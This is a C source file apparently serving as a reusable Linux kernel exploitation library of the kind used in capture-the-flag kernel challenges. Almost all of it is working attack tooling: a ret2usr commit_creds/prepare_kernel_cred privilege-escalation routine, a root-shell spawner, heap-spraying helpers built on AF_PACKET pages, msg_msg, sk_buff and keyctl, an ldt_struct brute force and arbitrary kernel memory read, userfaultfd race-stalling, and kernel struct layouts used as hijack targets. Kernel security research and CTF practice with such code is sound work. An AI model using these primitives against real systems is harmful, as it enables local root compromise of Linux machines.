
#ifndef _GNU_SOURCE
  #define _GNU_SOURCE 
#endif

#include <sys/types.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/sem.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>
/*#include <asm/ldt.h>*/

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <semaphore.h>
#include <sched.h>
#include <pthread.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <ctype.h>

size_t kernel_base = 0xffffffff81000000, kernel_offset = 0;
size_t page_offset_base = 0xffff888000000000, vmemmap_base = 0xffffea0000000000;
size_t prepare_kernel_cred = 0, commit_creds = 0;
size_t init_task, init_nsproxy, init_cred;

void err_exit(char *msg)
{
    printf("\033[31m\033[1m[-] %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

void err_info(char *msg)
{
    printf("\033[31m\033[1m[-] %s\033[0m\n", msg);
}

void warn_info(char *msg)
{
    printf("\033[33m\033[1m[!] %s\033[0m\n", msg);
}

void note_info(char *msg)
{
    printf("\033[34m\033[1m[*] %s\033[0m\n", msg);
}

void good_info(char *msg)
{
    printf("\033[32m\033[1m[+] %s\033[0m\n", msg);
}

size_t direct_map_addr_to_page_addr(size_t direct_map_addr)
{
    size_t page_count;
    page_count = ((direct_map_addr & (~0xfff)) - page_offset_base) / 0x1000;
    return vmemmap_base + page_count * 0x40;
}

/* userspace status saver */
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    note_info("Start to exploit...");
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    good_info("Status has been saved.");
}

void get_root_shell(void)
{
    if(getuid()) 
    {
        err_exit("Failed to get the root!");
    }

    good_info("Successful to get the root.");
    note_info("Execve root shell now...");
    system("/bin/sh");
    
    /* to exit the process normally, instead of segmentation fault */
    exit(EXIT_SUCCESS);
}

/* bind the process to specific core */
void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    printf("\033[32m\033[1m[+] Process binded to core %d\033[0m\n", core);
}


/* for ret2usr attacker */
void get_root_privilige(size_t prepare_kernel_cred, size_t commit_creds)
{
    void *(*prepare_kernel_cred_ptr)(void *) = 
                                         (void *(*)(void*)) prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = (int (*)(void*)) commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}

// this is a universal function to print binary data from a char* array
void print_binary(char* buf, int length)
{
    puts("\033[32m\033[1m---------------------------------------------------------------------------\033[0m");
    printf("\033[32m\033[1m[+] Address info starting in: %p\033[0m\n", buf);
    int index = 0;
    char output_buffer[80];
    memset(output_buffer, '\0', 80);
    memset(output_buffer, ' ', 0x10);
    for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
        char temp_buffer[0x10];
        memset(temp_buffer, '\0', 0x10);
        sprintf(temp_buffer, "%#5x", index);
        strcpy(output_buffer, temp_buffer);
        output_buffer[5] = ' ';
        output_buffer[6] = '|';
        output_buffer[7] = ' ';
        for(int j=0; j<16; j++){
            if(index+j >= length)
                sprintf(output_buffer+8+3*j, "   ");
            else{
                sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
                if(!isprint(buf[index+j]))
                    output_buffer[58+j] = '.';
                else
                    output_buffer[58+j] = buf[index+j];
            }
        }
        output_buffer[55] = ' ';
        output_buffer[56] = '|';
        output_buffer[57] = ' ';
        printf("%s\n", output_buffer);
        memset(output_buffer+58, '\0', 16);
        index += 16;
    }
    puts("\033[32m\033[1m---------------------------------------------------------------------------\033[0m");
}

void get_function_address()
{
    FILE* sym_table_fd = fopen("/tmp/kallsyms", "r");
    //FILE* sym_table_fd = fopen("/proc/kallsyms", "r");
    if(sym_table_fd < 0)
    {
        err_exit("Failed to open the sym_table file!");
    }
    char func_name[0x50], type[0x10];
    size_t addr;
    while(fscanf(sym_table_fd, "%lx%s%s", &addr, type, func_name))
    {
        if(prepare_kernel_cred && commit_creds)
            break;

        if(!commit_creds && !strcmp(func_name, "commit_creds"))
        {
            commit_creds = addr;
            printf("\033[32m\033[1m[+] Successful to get the addr of commit_cread: \033[0m%p\n", commit_creds);
            continue;
        }

        if(!strcmp(func_name, "prepare_kernel_cred"))
        {
            prepare_kernel_cred = addr;
            printf("\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred: \033[0m%p\n", prepare_kernel_cred);
            continue;
        }
    }
}

/**
 * @brief create an isolate namespace
 * note that the caller **SHOULD NOT** be used to get the root, but an operator
 * to perform basic exploiting operations in it only
 */
void unshare_setup(void)
{
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}

/**
 * II - fundamental  kernel structures
 * e.g. list_head
 */
struct list_head {
    uint64_t    next;
    uint64_t    prev;
};

/**
 * III -  pgv pages sprayer related 
 * not that we should create two process:
 * - the parent is the one to send cmd and get root
 * - the child creates an isolate userspace by calling unshare_setup(),
 *      receiving cmd from parent and operates it only
 */
#define PGV_PAGE_NUM 1000
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
struct pgv_page_request {
    int idx;
    int cmd;
    unsigned int size;
    unsigned int nr;
};

/* operations type */
enum {
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

/* tpacket version for setsockopt */
enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

/* pipe for cmd communication */
int cmd_pipe_req[2], cmd_pipe_reply[2];

/* create a socket and alloc pages, return the socket fd */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr)
{
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        err_info("failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, 
                     &version, sizeof(version));
    if (ret < 0) {
        err_info("failed at setsockopt(PACKET_VERSION)");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        err_info("failed at setsockopt(PACKET_TX_RING)");
        goto err_setsockopt;
    }

    return socket_fd;

err_setsockopt:
    close(socket_fd);
err_out:
    return ret;
}

/* the parent process should call it to send command of allocation to child */
int alloc_page(int idx, unsigned int size, unsigned int nr)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_ALLOC_PAGE,
        .size = size,
        .nr = nr,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* the parent process should call it to send command of freeing to child */
int free_page(int idx)
{
    struct pgv_page_request req = {
        .idx = idx,
        .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* the child, handler for commands from the pipe */
void spray_cmd_handler(void)
{
    struct pgv_page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* create an isolate namespace*/
    unshare_setup();

    /* handler request */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(req.size, req.nr);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else {
            printf("\033[31m\033[1m[-] invalid request: %d\033[0m\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}

/* init pgv-exploit subsystem :) */
void prepare_pgv_system(void)
{
    /* pipe for pgv */
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);
    
    /* child process for pages spray */
    if (!fork()) {
        spray_cmd_handler();
    }
}

/**
 * IV - keyctl related
*/

/**
 * The MUSL also doesn't contain `keyctl.h` :( 
 * Luckily we just need a bit of micros in exploitation, 
 * so just define them directly is okay :)
 */

#define KEY_SPEC_PROCESS_KEYRING    -2  /* - key ID for process-specific keyring */
#define KEYCTL_UPDATE           2   /* update a key */
#define KEYCTL_REVOKE           3   /* revoke a key */
#define KEYCTL_UNLINK           9   /* unlink a key from a keyring */
#define KEYCTL_READ         11  /* read a key or keyring's contents */

int key_alloc(char *description, void *payload, size_t plen)
{
    return syscall(__NR_add_key, "user", description, payload, plen, 
                   KEY_SPEC_PROCESS_KEYRING);
}

int key_update(int keyid, void *payload, size_t plen)
{
    return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

int key_read(int keyid, void *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

int key_unlink(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
}

/**
 * V - sk_buff spraying related
 * note that the sk_buff's tail is with a 320-bytes skb_shared_info
 */
#define SOCKET_NUM 8
#define SK_BUFF_NUM 128

/**
 * socket's definition should be like:
 * int sk_sockets[SOCKET_NUM][2];
 */

int init_socket_array(int sk_socket[SOCKET_NUM][2])
{
    /* socket pairs to spray sk_buff */
    for (int i = 0; i < SOCKET_NUM; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i]) < 0) {
            printf("\033[31m\033[1m[-] failed to create no.%d socket pair!\033[0m\n", i);
            return -1;
        }
    }

    return 0;
}

int spray_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++) {
        for (int j = 0; j < SK_BUFF_NUM; j++) {
            if (write(sk_socket[i][0], buf, size) < 0) {
                printf("\033[31m\033[1m[-] failed to spray %d sk_buff for %d socket!\033[0m\n", j, i);
                return -1;
            }
        }
    }

    return 0;
}

int free_sk_buff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++) {
        for (int j = 0; j < SK_BUFF_NUM; j++) {
            if (read(sk_socket[i][1], buf, size) < 0) {
                err_info("failed to received sk_buff!");
                return -1;
            }
        }
    }

    return 0;
}

/**
 * VI - msg_msg related
*/

#ifndef MSG_COPY
#define MSG_COPY 040000
#endif

struct msg_msg {
    struct list_head m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
};

struct msg_msgseg {
    uint64_t    next;
};

/*
struct msgbuf {
    long mtype;
    char mtext[0];
};
*/

int get_msg_queue(void)
{
    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
}

int read_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 0);
}

/**
 * the msgp should be a pointer to the `struct msgbuf`,
 * and the data should be stored in msgbuf.mtext
 */
int write_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    ((struct msgbuf*)msgp)->mtype = msgtyp;
    return msgsnd(msqid, msgp, msgsz, 0);
}

/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */
int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz, msgtyp, 
                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, 
              uint64_t m_type, uint64_t m_ts,  uint64_t next, uint64_t security)
{
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

/**
 * VII - ldt_struct related
*/

/**
 * Somethings we may want to compile the exp binary with MUSL-GCC, which
 * doesn't contain the `asm/ldt.h` file.
 * As the file is small, I copy that directly to here :)
 */

/* Maximum number of LDT entries supported. */
#define LDT_ENTRIES 8192
/* The size of each LDT entry. */
#define LDT_ENTRY_SIZE  8

#ifndef __ASSEMBLY__
/*
 * Note on 64bit base and limit is ignored and you cannot set DS/ES/CS
 * not to the default values if you still want to do syscalls. This
 * call is more for 32bit mode therefore.
 */
struct user_desc {
    unsigned int  entry_number;
    unsigned int  base_addr;
    unsigned int  limit;
    unsigned int  seg_32bit:1;
    unsigned int  contents:2;
    unsigned int  read_exec_only:1;
    unsigned int  limit_in_pages:1;
    unsigned int  seg_not_present:1;
    unsigned int  useable:1;
#ifdef __x86_64__
    /*
     * Because this bit is not present in 32-bit user code, user
     * programs can pass uninitialized values here.  Therefore, in
     * any context in which a user_desc comes from a 32-bit program,
     * the kernel must act as though lm == 0, regardless of the
     * actual value.
     */
    unsigned int  lm:1;
#endif
};

#define MODIFY_LDT_CONTENTS_DATA    0
#define MODIFY_LDT_CONTENTS_STACK   1
#define MODIFY_LDT_CONTENTS_CODE    2

#endif /* !__ASSEMBLY__ */

/* this should be referred to your kernel */
#define SECONDARY_STARTUP_64 0xffffffff81000060

/* desc initializer */
static inline void init_desc(struct user_desc *desc)
{
    /* init descriptor info */
    desc->base_addr = 0xff0000;
    desc->entry_number = 0x8000 / 8;
    desc->limit = 0;
    desc->seg_32bit = 0;
    desc->contents = 0;
    desc->limit_in_pages = 0;
    desc->lm = 0;
    desc->read_exec_only = 0;
    desc->seg_not_present = 0;
    desc->useable = 0;
}

/**
 * @brief burte-force hitting page_offset_base by modifying ldt_struct
 * 
 * @param ldt_cracker function to make the ldt_struct modifiable
 * @param cracker_args args of ldt_cracker
 * @param ldt_momdifier function to modify the ldt_struct->entries
 * @param momdifier_args args of ldt_momdifier
 * @param burte_size size of each burte-force hitting
 * @return size_t address of page_offset_base
 */
size_t ldt_guessing_direct_mapping_area(void *(*ldt_cracker)(void*),
                                        void *cracker_args,
                                        void *(*ldt_momdifier)(void*, size_t), 
                                        void *momdifier_args,
                                        uint64_t burte_size)
{
    struct user_desc desc;
    uint64_t page_offset_base = 0xffff888000000000;
    uint64_t temp;
    char *buf;
    int retval;

    /* init descriptor info */
    init_desc(&desc);

    /* make the ldt_struct modifiable */
    ldt_cracker(cracker_args);
    syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));

    /* leak kernel direct mapping area by modify_ldt() */
    while(1) {
        ldt_momdifier(momdifier_args, page_offset_base);
        retval = syscall(SYS_modify_ldt, 0, &temp, 8);
        if (retval > 0) {
            break;
        }
        else if (retval == 0) {
            err_info("no mm->context.ldt!");
            page_offset_base = -1;
            break;
        }
        page_offset_base += burte_size;
    }
    
    return page_offset_base;
}

/**
 * @brief read the contents from a specific kernel memory.
 * Note that we should call ldtGuessingDirectMappingArea() firstly,
 * and the function should be used in that caller process
 * 
 * @param ldt_momdifier function to modify the ldt_struct->entries
 * @param momdifier_args args of ldt_momdifier
 * @param addr address of kernel memory to read
 * @param res_buf buf to be written the data from kernel memory
 */
void ldt_arbitrary_read(void *(*ldt_momdifier)(void*, size_t), 
                        void *momdifier_args, size_t addr, char *res_buf)
{
    static char buf[0x8000];
    struct user_desc desc;
    uint64_t temp;
    int pipe_fd[2];

    /* init descriptor info */
    init_desc(&desc);

    /* modify the ldt_struct->entries to addr */
    ldt_momdifier(momdifier_args, addr);

    /* read data by the child process */
    pipe(pipe_fd);
    if (!fork()) {
        /* child */
        syscall(SYS_modify_ldt, 0, buf, 0x8000);
        write(pipe_fd[1], buf, 0x8000);
        exit(0);
    } else {
        /* parent */
        wait(NULL);
        read(pipe_fd[0], res_buf, 0x8000);
    }

    close(pipe_fd[0]);
    close(pipe_fd[1]);
}

/**
 * @brief seek specific content in the memory.
 * Note that we should call ldtGuessingDirectMappingArea() firstly,
 * and the function should be used in that caller process
 * 
 * @param ldt_momdifier function to modify the ldt_struct->entries
 * @param momdifier_args args of ldt_momdifier
 * @param page_offset_base the page_offset_base we leakked before
 * @param mem_finder your own function to search on a 0x8000-bytes buf.
 *          It should be like `size_t func(void *args, char *buf)` and the `buf`
 *          is where we store the data from kernel in ldt_seeking_memory().
 *          The return val should be the offset of the `buf`, `-1` for failure
 * @param finder_args your own function's args
 * @return size_t kernel addr of content to find, -1 for failure
 */
size_t ldt_seeking_memory(void *(*ldt_momdifier)(void*, size_t), 
                        void *momdifier_args, uint64_t page_offset_base,
                        size_t (*mem_finder)(void*, char *), void *finder_args)
{
    static char buf[0x8000];
    size_t search_addr, result_addr = -1, offset;

    search_addr = page_offset_base;

    while (1) {
        ldt_arbitrary_read(ldt_momdifier, momdifier_args, search_addr, buf);

        offset = mem_finder(finder_args, buf);
        if (offset != -1) {
            result_addr = search_addr + offset;
            break;
        }

        search_addr += 0x8000;
    }

    return result_addr;
}

/**
 * VIII - userfaultfd related code
 */

/**
 * The MUSL also doesn't contain `userfaultfd.h` :( 
 * Luckily we just need a bit of micros in exploitation, 
 * so just define them directly is okay :)
 */

#define UFFD_API ((uint64_t)0xAA)
#define _UFFDIO_REGISTER        (0x00)
#define _UFFDIO_COPY            (0x03)
#define _UFFDIO_API         (0x3F)

/* userfaultfd ioctl ids */
#define UFFDIO 0xAA
#define UFFDIO_API      _IOWR(UFFDIO, _UFFDIO_API,  \
                      struct uffdio_api)
#define UFFDIO_REGISTER     _IOWR(UFFDIO, _UFFDIO_REGISTER, \
                      struct uffdio_register)
#define UFFDIO_COPY     _IOWR(UFFDIO, _UFFDIO_COPY, \
                      struct uffdio_copy)

/* read() structure */
struct uffd_msg {
    uint8_t event;

    uint8_t reserved1;
    uint16_t    reserved2;
    uint32_t    reserved3;

    union {
        struct {
            uint64_t    flags;
            uint64_t    address;
            union {
                uint32_t ptid;
            } feat;
        } pagefault;

        struct {
            uint32_t    ufd;
        } fork;

        struct {
            uint64_t    from;
            uint64_t    to;
            uint64_t    len;
        } remap;

        struct {
            uint64_t    start;
            uint64_t    end;
        } remove;

        struct {
            /* unused reserved fields */
            uint64_t    reserved1;
            uint64_t    reserved2;
            uint64_t    reserved3;
        } reserved;
    } arg;
} __attribute__((packed));

#define UFFD_EVENT_PAGEFAULT    0x12

struct uffdio_api {
    uint64_t api;
    uint64_t features;
    uint64_t ioctls;
};

struct uffdio_range {
    uint64_t start;
    uint64_t len;
};

struct uffdio_register {
    struct uffdio_range range;
#define UFFDIO_REGISTER_MODE_MISSING    ((uint64_t)1<<0)
#define UFFDIO_REGISTER_MODE_WP     ((uint64_t)1<<1)
    uint64_t mode;
    uint64_t ioctls;
};


struct uffdio_copy {
    uint64_t dst;
    uint64_t src;
    uint64_t len;
#define UFFDIO_COPY_MODE_DONTWAKE       ((uint64_t)1<<0)
    uint64_t mode;
    int64_t copy;
};

//#include <linux/userfaultfd.h>

char temp_page_for_stuck[0x1000];

void register_userfaultfd(pthread_t *monitor_thread, void *addr,
                          unsigned long len, void *(*handler)(void*))
{
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1) {
        err_exit("userfaultfd");
    }

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) {
        err_exit("ioctl-UFFDIO_API");
    }

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) {
        err_exit("ioctl-UFFDIO_REGISTER");
    }

    s = pthread_create(monitor_thread, NULL, handler, (void *) uffd);
    if (s != 0) {
        err_exit("pthread_create");
    }
}

void *uffd_handler_for_stucking_thread(void *args)
{
    struct uffd_msg msg;
    int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) args;

    for (;;) {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        if (nready == -1) {
            err_exit("poll");
        }

        nread = read(uffd, &msg, sizeof(msg));

        /* just stuck there is okay... */
        sleep(100000000);

        if (nread == 0) {
            err_exit("EOF on userfaultfd!");
        }

        if (nread == -1) {
            err_exit("read");
        }

        if (msg.event != UFFD_EVENT_PAGEFAULT) {
            err_exit("Unexpected event on userfaultfd");
        }

        uffdio_copy.src = (unsigned long long) temp_page_for_stuck;
        uffdio_copy.dst = (unsigned long long) msg.arg.pagefault.address &
                                                    ~(0x1000 - 1);
        uffdio_copy.len = 0x1000;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) {
            err_exit("ioctl-UFFDIO_COPY");
        }

        return NULL;
    }
}

void register_userfaultfd_for_thread_stucking(pthread_t *monitor_thread, 
                                          void *buf, unsigned long len)
{
    register_userfaultfd(monitor_thread, buf, len, 
                         uffd_handler_for_stucking_thread);
}

/**
 * IX - kernel structures 
 */

struct file;
struct file_operations;
struct tty_struct;
struct tty_driver;
struct serial_icounter_struct;
struct ktermios;
struct termiox;
struct seq_operations;

struct seq_file {
    char *buf;
    size_t size;
    size_t from;
    size_t count;
    size_t pad_until;
    loff_t index;
    loff_t read_pos;
    uint64_t lock[4]; //struct mutex lock;
    const struct seq_operations *op;
    int poll_event;
    const struct file *file;
    void *private;
};

struct seq_operations {
    void * (*start) (struct seq_file *m, loff_t *pos);
    void (*stop) (struct seq_file *m, void *v);
    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
    int (*show) (struct seq_file *m, void *v);
};

struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
              const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
            unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
                struct serial_icounter_struct *icount);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    const struct file_operations *proc_fops;
};

struct page;
struct pipe_inode_info;
struct pipe_buf_operations;

/* read start from len to offset, write start from offset */
struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;
    unsigned int flags;
    unsigned long private;
};

struct pipe_buf_operations {
    /*
     * ->confirm() verifies that the data in the pipe buffer is there
     * and that the contents are good. If the pages in the pipe belong
     * to a file system, we may need to wait for IO completion in this
     * hook. Returns 0 for good, or a negative error value in case of
     * error.  If not present all pages are considered good.
     */
    int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);

    /*
     * When the contents of this pipe buffer has been completely
     * consumed by a reader, ->release() is called.
     */
    void (*release)(struct pipe_inode_info *, struct pipe_buffer *);

    /*
     * Attempt to take ownership of the pipe buffer and its contents.
     * ->try_steal() returns %true for success, in which case the contents
     * of the pipe (the buf->page) is locked and now completely owned by the
     * caller. The page may then be transferred to a different mapping, the
     * most often used case is insertion into different file address space
     * cache.
     */
    int (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);

    /*
     * Get a reference to the pipe buffer.
     */
    int (*get)(struct pipe_inode_info *, struct pipe_buffer *);
};